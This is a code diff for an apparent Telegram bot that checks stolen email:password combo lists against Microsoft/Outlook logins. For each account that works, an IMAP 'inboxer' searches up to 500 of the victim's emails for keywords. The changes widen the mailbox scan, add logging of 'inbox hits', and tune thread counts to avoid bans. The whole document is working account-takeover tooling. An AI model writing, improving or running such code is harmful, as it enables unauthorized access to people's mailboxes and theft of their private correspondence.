@@ -65,30 +65,37 @@ def get_user_data(context: ContextTypes.DEFAULT_TYPE) -> dict:
 
 
 # ═══════════════════════════════════════════════════════════════
-# INBOXER: IMAP-based real email subject fetcher
+# INBOXER: IMAP-based real email subject fetcher — ALL EMAILS
 # ═══════════════════════════════════════════════════════════════
-def fetch_inbox_subjects(email_addr, password, keywords=None, max_emails=50):
+def fetch_inbox_subjects(email_addr, password, keywords=None, max_emails=500):
     """
-    Connects to Outlook/Hotmail via IMAP and fetches real email subjects.
-    If keywords provided, only returns subjects matching keywords.
+    Connects to Outlook/Hotmail via IMAP and fetches ALL email subjects.
+    Searches the entire inbox but caps at max_emails to prevent hanging.
     Returns: (success: bool, matched_keywords: list, subjects: list)
     """
     imap = None
     try:
-        imap = imaplib.IMAP4_SSL("outlook.office365.com", timeout=15)
+        logger.info(f"[IMAP] Connecting: {email_addr}")
+        imap = imaplib.IMAP4_SSL("outlook.office365.com", timeout=20)
         imap.login(email_addr, password)
         imap.select("INBOX")
 
         status, messages = imap.search(None, "ALL")
         if status != "OK":
+            logger.warning(f"[IMAP] Search failed for {email_addr}")
             return False, [], []
 
         msg_ids = messages[0].split()
+        total_emails = len(msg_ids)
+        logger.info(f"[IMAP] {email_addr} has {total_emails} emails")
+
         if not msg_ids:
             return False, [], []
 
-        # Get last N emails (newest first)
-        msg_ids = msg_ids[-max_emails:]
+        # Scan ALL emails but cap at max_emails to prevent freezing
+        if total_emails > max_emails:
+            logger.info(f"[IMAP] Capping from {total_emails} to {max_emails} emails")
+            msg_ids = msg_ids[-max_emails:]  # Get newest max_emails
 
         subjects = []
         matched_keywords = set()
@@ -131,27 +138,35 @@ def fetch_inbox_subjects(email_addr, password, keywords=None, max_emails=50):
                             else:
                                 from_str += part
 
+                        full_text = f"{subject_str} {from_str}".lower()
+
                         # Check keywords if provided
                         if keywords:
-                            combined = f"{subject_str} {from_str}".lower()
-                            found = [kw for kw in keywords if kw.lower() in combined]
+                            found = [kw for kw in keywords if kw.lower() in full_text]
                             if found:
                                 subjects.append(f"{subject_str}  [From: {from_str}]")
                                 matched_keywords.update(found)
                         else:
                             subjects.append(f"{subject_str}  [From: {from_str}]")
 
-            except Exception:
+            except Exception as e:
+                logger.debug(f"[IMAP] Parse error for {email_addr}: {e}")
                 continue
 
         imap.close()
         imap.logout()
 
+        logger.info(
+            f"[IMAP] {email_addr} done. Matched: {len(matched_keywords)} keywords, "
+            f"{len(subjects)} subjects"
+        )
+
         if keywords:
             return len(matched_keywords) > 0, list(matched_keywords), subjects
         return len(subjects) > 0, [], subjects
 
-    except Exception:
+    except Exception as e:
+        logger.warning(f"[IMAP] FAILED for {email_addr}: {str(e)}")
         if imap:
             try:
                 imap.logout()
@@ -206,17 +221,23 @@ def check_account(email, password, keywords, stop_flag):
             token = parse_qs(urlparse(req.url).fragment).get("access_token", ["None"])[0]
             if token != "None":
                 # ── VALID ACCOUNT ──
-                # Now try IMAP inboxer if keywords are set
                 inbox_keywords = []
                 inbox_subjects = []
 
+                # ALWAYS run inboxer if keywords are set
                 if keywords:
+                    logger.info(f"[CHECKER] Running inboxer for {email}")
                     ok, found_kws, subjects = fetch_inbox_subjects(
-                        email, password, keywords, max_emails=50
+                        email, password, keywords, max_emails=500
                     )
                     if ok and found_kws:
                         inbox_keywords = found_kws
                         inbox_subjects = subjects
+                        logger.info(
+                            f"[CHECKER] INBOX HIT: {email} | KWs: {found_kws}"
+                        )
+                    else:
+                        logger.info(f"[CHECKER] No inbox match for {email}")
 
                 return "VALID", f"{email}:{password}", inbox_keywords, inbox_subjects
 
@@ -243,7 +264,8 @@ def check_account(email, password, keywords, stop_flag):
             return "BAD", f"{email}:{password}", [], []
 
         return "BAD", f"{email}:{password}", [], []
-    except Exception:
+    except Exception as e:
+        logger.warning(f"[CHECKER] Error for {email}: {e}")
         return "BAD", f"{email}:{password}", [], []
     finally:
         if session:
@@ -326,7 +348,11 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "set_threads":
         await query.edit_message_text(
-            "⚡ *Enter thread count* (1-200)\n\nRecommended: 50", parse_mode="Markdown"
+            "⚡ *Enter thread count* (1-200)\n\n"
+            "⚠️ *WARNING:* With inboxer enabled, use LOW threads (5-20)\n"
+            "Each account needs 2-5 seconds for IMAP scan.\n\n"
+            "Recommended: 10",
+            parse_mode="Markdown",
         )
         return THREADS
 
@@ -465,7 +491,8 @@ async def handle_keywords(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session["keywords"] = [k.strip().lower() for k in text.split(",") if k.strip()]
         await update.message.reply_text(
             f"✅ Keywords set: `{', '.join(session['keywords'])}`\n\n"
-            f"📬 Inboxer will scan last 50 emails for these keywords.",
+            f"📬 Inboxer will scan ALL emails (up to 500) for these keywords.\n\n"
+            f"⚠️ *IMPORTANT:* Use LOW threads (5-20) when inboxer is on!",
             parse_mode="Markdown",
         )
 
@@ -548,6 +575,16 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     chat_id = update.effective_chat.id
 
+    # Warn if threads too high with inboxer
+    if keywords and threads > 20:
+        await context.bot.send_message(
+            chat_id,
+            "⚠️ *WARNING:* You have inboxer ON with high threads!\n"
+            f"Current: `{threads}` threads. Recommended: `10`\n"
+            "IMAP is slow. High threads = timeouts & bans.",
+            parse_mode="Markdown",
+        )
+
     msg = await context.bot.send_message(
         chat_id, "🚀 *Starting check...*", parse_mode="Markdown"
     )
@@ -576,7 +613,7 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             if inbox_kws and inbox_subs:
                 results["inbox"] += 1
-                subs_text = " | ".join(inbox_subs[:10])  # limit subjects in file
+                subs_text = " | ".join(inbox_subs[:20])  # show up to 20 matching subjects
                 session["files"]["inbox"].append(
                     f"{account}\n"
                     f"   🔍 Keywords: {', '.join(inbox_kws)}\n"
@@ -601,7 +638,7 @@ async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
         total = len(combos)
         while results["checked"] < total and session["running"]:
             await update_progress(update, context, session)
-            await asyncio.sleep(3)
+            await asyncio.sleep(5)  # slower updates when IMAP is running
 
         if not session["stop_flag"]:
             await asyncio.gather(*futures, return_exceptions=True)
